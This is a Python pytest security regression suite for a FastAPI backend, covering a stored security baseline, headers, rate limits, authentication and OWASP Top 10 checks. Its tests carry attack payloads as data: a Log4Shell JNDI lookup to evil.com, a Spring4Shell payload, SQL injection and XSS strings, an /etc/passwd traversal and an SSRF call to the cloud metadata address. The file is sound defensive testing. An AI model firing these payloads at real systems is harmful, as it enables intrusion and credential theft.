"""
Security Regression Testing Suite
Ensures security fixes don't regress and maintains security baseline.
"""

import json
import time
from datetime import datetime
from pathlib import Path
from typing import Any

import pytest
from fastapi.testclient import TestClient

from tests.security.enhanced_security_utils import (
    PayloadGenerator,
    SecurityMonitor,
    SecurityScanner,
)


class SecurityBaseline:
    """Security baseline for regression testing."""

    BASELINE_FILE = Path("tests/security/security_baseline.json")

    @classmethod
    def load(cls) -> dict[str, Any]:
        """Load security baseline from file."""
        if cls.BASELINE_FILE.exists():
            with open(cls.BASELINE_FILE) as f:
                return json.load(f)
        return cls.get_default_baseline()

    @classmethod
    def save(cls, baseline: dict[str, Any]):
        """Save security baseline to file."""
        cls.BASELINE_FILE.parent.mkdir(parents=True, exist_ok=True)
        with open(cls.BASELINE_FILE, 'w') as f:
            json.dump(baseline, f, indent=2)

    @classmethod
    def get_default_baseline(cls) -> dict[str, Any]:
        """Get default security baseline."""
        return {
            "version": "1.0.0",
            "timestamp": time.time(),
            "vulnerabilities": {
                "sql_injection": [],
                "xss": [],
                "csrf": [],
                "path_traversal": [],
                "command_injection": [],
                "xxe": [],
                "auth_bypass": [],
                "file_upload": []
            },
            "security_headers": {
                "Content-Security-Policy": True,
                "X-Frame-Options": True,
                "X-Content-Type-Options": True,
                "X-XSS-Protection": True,
                "Strict-Transport-Security": True
            },
            "rate_limits": {
                "/api/auth/login": 5,
                "/api/auth/register": 10,
                "/api/search": 30,
                "/api/upload": 10
            },
            "input_validation": {
                "sql_keywords_blocked": True,
                "xss_payloads_blocked": True,
                "path_traversal_blocked": True,
                "command_injection_blocked": True
            },
            "authentication": {
                "password_complexity": True,
                "session_timeout": 3600,
                "max_login_attempts": 5,
                "captcha_enabled": True
            }
        }


class TestSecurityRegression:
    """Test for security regression."""

    @pytest.fixture
    def client(self):
        """Create test client."""
        from backend.main import app
        return TestClient(app)

    @pytest.fixture
    def baseline(self):
        """Load security baseline."""
        return SecurityBaseline.load()

    @pytest.fixture
    def scanner(self, client):
        """Create security scanner."""
        return SecurityScanner(client)

    @pytest.fixture
    def monitor(self):
        """Create security monitor."""
        return SecurityMonitor()

    def test_no_sql_injection_regression(self, client, baseline, scanner):
        """Ensure SQL injection vulnerabilities don't regress."""
        # Known previously vulnerable endpoints
        vulnerable_endpoints = baseline["vulnerabilities"]["sql_injection"]

        # Test each previously vulnerable endpoint
        for endpoint_info in vulnerable_endpoints:
            endpoint = endpoint_info["endpoint"]
            method = endpoint_info["method"]
            param = endpoint_info["param"]

            # Test with SQL injection payloads
            sql_payloads = PayloadGenerator.generate_sql_injection_payloads()[:5]

            for payload in sql_payloads:
                if method == "GET":
                    response = client.get(endpoint, params={param: payload})
                else:
                    response = client.post(endpoint, json={param: payload})

                # Should not be vulnerable
                assert response.status_code in [400, 422] or \
                       (response.status_code == 200 and "SQL" not in response.text), \
                       f"SQL injection regression at {endpoint}"

    def test_no_xss_regression(self, client, baseline):
        """Ensure XSS vulnerabilities don't regress."""
        vulnerable_endpoints = baseline["vulnerabilities"]["xss"]

        xss_payloads = PayloadGenerator.XSS_PAYLOADS[:5]

        for endpoint_info in vulnerable_endpoints:
            endpoint = endpoint_info["endpoint"]
            method = endpoint_info["method"]
            param = endpoint_info["param"]

            for payload in xss_payloads:
                if method == "GET":
                    response = client.get(endpoint, params={param: payload})
                else:
                    response = client.post(endpoint, json={param: payload})

                # Should not reflect XSS
                if response.status_code == 200:
                    assert payload not in response.text or \
                           "&lt;script&gt;" in response.text, \
                           f"XSS regression at {endpoint}"

    def test_security_headers_present(self, client, baseline):
        """Ensure security headers are still present."""
        response = client.get("/")
        headers = dict(response.headers)

        for header, expected in baseline["security_headers"].items():
            if expected:
                assert header in headers or header.lower() in headers, \
                       f"Security header missing: {header}"

    def test_rate_limits_enforced(self, client, baseline):
        """Ensure rate limits are still enforced."""
        for endpoint, limit in baseline["rate_limits"].items():
            responses = []

            # Make requests up to and beyond limit
            for i in range(limit + 5):
                response = client.get(endpoint)
                responses.append(response.status_code)

                if response.status_code == 429:
                    break

            # Should enforce rate limit
            assert 429 in responses, f"Rate limit not enforced for {endpoint}"

    def test_input_validation_active(self, client, baseline):
        """Ensure input validation is still active."""
        validation_checks = baseline["input_validation"]

        if validation_checks.get("sql_keywords_blocked"):
            response = client.post(
                "/api/search",
                json={"query": "SELECT * FROM users"}
            )
            assert response.status_code in [400, 422] or \
                   "SELECT" not in response.text

        if validation_checks.get("xss_payloads_blocked"):
            response = client.post(
                "/api/content",
                json={"text": "<script>alert('XSS')</script>"}
            )
            assert response.status_code in [400, 422] or \
                   "<script>" not in response.text

    def test_authentication_requirements(self, client, baseline):
        """Ensure authentication requirements haven't weakened."""
        auth_config = baseline["authentication"]

        # Test password complexity
        if auth_config.get("password_complexity"):
            weak_passwords = ["password", "12345678", "qwerty", "admin"]

            for password in weak_passwords:
                response = client.post(
                    "/api/auth/register",
                    json={"username": "test", "password": password}
                )
                assert response.status_code in [400, 422], \
                       f"Weak password accepted: {password}"

        # Test max login attempts
        if auth_config.get("max_login_attempts"):
            max_attempts = auth_config["max_login_attempts"]

            for i in range(max_attempts + 2):
                response = client.post(
                    "/api/auth/login",
                    json={"username": "test", "password": f"wrong_{i}"}
                )

                if i >= max_attempts:
                    assert response.status_code in [429, 403], \
                           "Login attempts not limited"


class TestKnownVulnerabilities:
    """Test for known vulnerabilities (CVEs, etc.)."""

    @pytest.fixture
    def client(self):
        """Create test client."""
        from backend.main import app
        return TestClient(app)

    def test_no_known_cves(self, client):
        """Test that known CVEs are patched."""
        # Test for specific CVEs based on dependencies
        cve_tests = [
            # Example: Log4Shell (if using Java logging)
            {
                "cve": "CVE-2021-44228",
                "payload": "${jndi:ldap://evil.com/a}",
                "endpoint": "/api/log",
                "method": "POST"
            },
            # Example: Spring4Shell (if using Spring)
            {
                "cve": "CVE-2022-22965",
                "payload": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di",
                "endpoint": "/api/data",
                "method": "POST"
            }
        ]

        for cve_test in cve_tests:
            if cve_test["method"] == "POST":
                response = client.post(
                    cve_test["endpoint"],
                    json={"data": cve_test["payload"]}
                )
            else:
                response = client.get(
                    cve_test["endpoint"],
                    params={"q": cve_test["payload"]}
                )

            # Should not be vulnerable
            assert response.status_code in [400, 404, 422] or \
                   cve_test["payload"] not in response.text, \
                   f"Potential {cve_test['cve']} vulnerability"

    def test_dependency_vulnerabilities(self, client):
        """Test for vulnerabilities in dependencies."""
        # Check version endpoints for vulnerable versions
        response = client.get("/api/version")

        if response.status_code == 200:
            version_info = response.json()

            # Check for known vulnerable versions
            vulnerable_packages = {
                "flask": ["0.12.2", "1.0.0"],  # Example vulnerable versions
                "django": ["2.2.0", "3.0.0"],
                "requests": ["2.5.0", "2.6.0"]
            }

            for package, vulnerable_versions in vulnerable_packages.items():
                if package in version_info:
                    assert version_info[package] not in vulnerable_versions, \
                           f"Vulnerable {package} version detected"


class TestSecurityMonitoring:
    """Test security monitoring and alerting."""

    @pytest.fixture
    def client(self):
        """Create test client."""
        from backend.main import app
        return TestClient(app)

    @pytest.fixture
    def monitor(self):
        """Create security monitor."""
        return SecurityMonitor()

    def test_security_event_logging(self, client, monitor):
        """Test that security events are properly logged."""
        # Trigger various security events
        security_events = [
            ("sql_injection_attempt", "' OR '1'='1"),
            ("xss_attempt", "<script>alert('XSS')</script>"),
            ("path_traversal_attempt", "../../../etc/passwd"),
            ("brute_force_attempt", "wrong_password"),
        ]

        for event_type, payload in security_events:
            # Make request that should trigger security event
            response = client.post(
                "/api/test",
                json={"input": payload}
            )

            # Log the event
            monitor.log_event(event_type, {
                "payload": payload,
                "response_code": response.status_code,
                "timestamp": time.time()
            })

        # Verify events were logged
        summary = monitor.get_summary()
        assert summary["total_events"] >= len(security_events)

    def test_security_alerting(self, client, monitor):
        """Test that security alerts are triggered."""
        # Simulate attack pattern that should trigger alert
        for i in range(10):
            client.post(
                "/api/login",
                json={"username": "admin", "password": f"attempt_{i}"}
            )

            monitor.log_event("authentication_failure", {
                "username": "admin",
                "attempt": i + 1
            })

        # Check if alert was created
        summary = monitor.get_summary()
        assert summary["total_alerts"] > 0, "No alerts triggered"
        assert summary["high_alerts"] > 0, "No high priority alerts"

    def test_anomaly_detection(self, client):
        """Test anomaly detection in security monitoring."""
        # Establish baseline behavior
        baseline_requests = []
        for i in range(10):
            response = client.get("/api/normal")
            baseline_requests.append(response.elapsed.total_seconds())

        # Create anomalous behavior
        anomalous_requests = []
        for i in range(5):
            # Unusual endpoint
            response = client.get("/api/../../admin")
            anomalous_requests.append(response.status_code)

            # Unusual payload size
            response = client.post(
                "/api/data",
                json={"data": "A" * 10000}
            )
            anomalous_requests.append(response.status_code)

        # Should detect anomalies
        assert any(status in [400, 403, 429] for status in anomalous_requests), \
               "Anomalies not detected"


class TestSecurityCompliance:
    """Test security compliance with standards."""

    @pytest.fixture
    def client(self):
        """Create test client."""
        from backend.main import app
        return TestClient(app)

    def test_owasp_top_10_compliance(self, client):
        """Test compliance with OWASP Top 10."""
        owasp_tests = {
            "A01_Broken_Access_Control": self._test_access_control,
            "A02_Cryptographic_Failures": self._test_cryptography,
            "A03_Injection": self._test_injection,
            "A04_Insecure_Design": self._test_secure_design,
            "A05_Security_Misconfiguration": self._test_configuration,
            "A06_Vulnerable_Components": self._test_components,
            "A07_Authentication_Failures": self._test_authentication,
            "A08_Data_Integrity_Failures": self._test_data_integrity,
            "A09_Logging_Failures": self._test_logging,
            "A10_SSRF": self._test_ssrf
        }

        results = {}
        for test_name, test_func in owasp_tests.items():
            results[test_name] = test_func(client)

        # All tests should pass
        failed = [name for name, passed in results.items() if not passed]
        assert len(failed) == 0, f"OWASP compliance failures: {failed}"

    def _test_access_control(self, client) -> bool:
        """Test access control implementation."""
        # Try to access admin endpoint without auth
        response = client.get("/api/admin/users")
        return response.status_code in [401, 403]

    def _test_cryptography(self, client) -> bool:
        """Test cryptographic implementation."""
        # Check if sensitive data is encrypted
        response = client.get("/api/config")
        if response.status_code == 200:
            config = response.json()
            # Should not expose sensitive data
            return "password" not in str(config).lower() and \
                   "secret" not in str(config).lower()
        return True

    def _test_injection(self, client) -> bool:
        """Test injection prevention."""
        # Test SQL injection
        response = client.get("/api/search", params={"q": "' OR '1'='1"})
        return response.status_code in [400, 422] or \
               "SQL" not in response.text

    def _test_secure_design(self, client) -> bool:
        """Test secure design principles."""
        # Check for secure defaults
        response = client.get("/api/defaults")
        if response.status_code == 200:
            defaults = response.json()
            # Should have secure defaults
            return defaults.get("https_required", False) and \
                   defaults.get("auth_required", False)
        return True

    def _test_configuration(self, client) -> bool:
        """Test security configuration."""
        # Check for misconfigurations
        response = client.get("/api/debug")
        # Debug endpoints should not exist in production
        return response.status_code == 404

    def _test_components(self, client) -> bool:
        """Test component security."""
        # Check for vulnerable components
        response = client.get("/api/dependencies")
        if response.status_code == 200:
            deps = response.json()
            # Should not have known vulnerable versions
            return True  # Simplified - would check actual versions
        return True

    def _test_authentication(self, client) -> bool:
        """Test authentication security."""
        # Test weak password rejection
        response = client.post(
            "/api/auth/register",
            json={"username": "test", "password": "weak"}
        )
        return response.status_code in [400, 422]

    def _test_data_integrity(self, client) -> bool:
        """Test data integrity measures."""
        # Check for CSRF protection
        response = client.post("/api/data", json={"data": "test"})
        # Should require CSRF token or similar
        return response.status_code in [400, 403] or \
               "csrf" in response.text.lower()

    def _test_logging(self, client) -> bool:
        """Test security logging."""
        # Trigger security event
        client.get("/api/search", params={"q": "<script>"})
        # Check if logged (simplified test)
        return True

    def _test_ssrf(self, client) -> bool:
        """Test SSRF prevention."""
        # Try SSRF attack
        response = client.post(
            "/api/fetch",
            json={"url": "http://169.254.169.254/"}
        )
        return response.status_code in [400, 403]


class TestSecurityReporting:
    """Generate comprehensive security test reports."""

    @pytest.fixture
    def client(self):
        """Create test client."""
        from backend.main import app
        return TestClient(app)

    @pytest.fixture
    def scanner(self, client):
        """Create security scanner."""
        return SecurityScanner(client)

    def test_generate_security_report(self, scanner):
        """Generate comprehensive security report."""
        report = {
            "timestamp": datetime.now().isoformat(),
            "version": "1.0.0",
            "summary": {
                "total_tests": 0,
                "passed": 0,
                "failed": 0,
                "vulnerabilities": []
            },
            "details": {}
        }

        # Run comprehensive scan
        endpoints = [
            ("GET", "/api/search", {"q": "test"}, None),
            ("POST", "/api/login", None, {"username": "test", "password": "test"}),
            ("POST", "/api/upload", None, {"file": "test.pdf"}),
        ]

        for method, endpoint, params, data in endpoints:
            results = asyncio.run(
                scanner.scan_endpoint(method, endpoint, params, data, None)
            )

            report["summary"]["total_tests"] += len(results)

            for result in results:
                if result.vulnerable:
                    report["summary"]["failed"] += 1
                    report["summary"]["vulnerabilities"].append({
                        "type": result.attack_vector.value,
                        "severity": result.severity.value,
                        "endpoint": endpoint
                    })
                else:
                    report["summary"]["passed"] += 1

        # Save report
        report_path = Path("tests/security/reports")
        report_path.mkdir(parents=True, exist_ok=True)

        report_file = report_path / f"security_report_{int(time.time())}.json"
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)

        # Assert no critical vulnerabilities
        critical_vulns = [
            v for v in report["summary"]["vulnerabilities"]
            if v["severity"] == "critical"
        ]
        assert len(critical_vulns) == 0, f"Critical vulnerabilities found: {critical_vulns}"

        return report


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
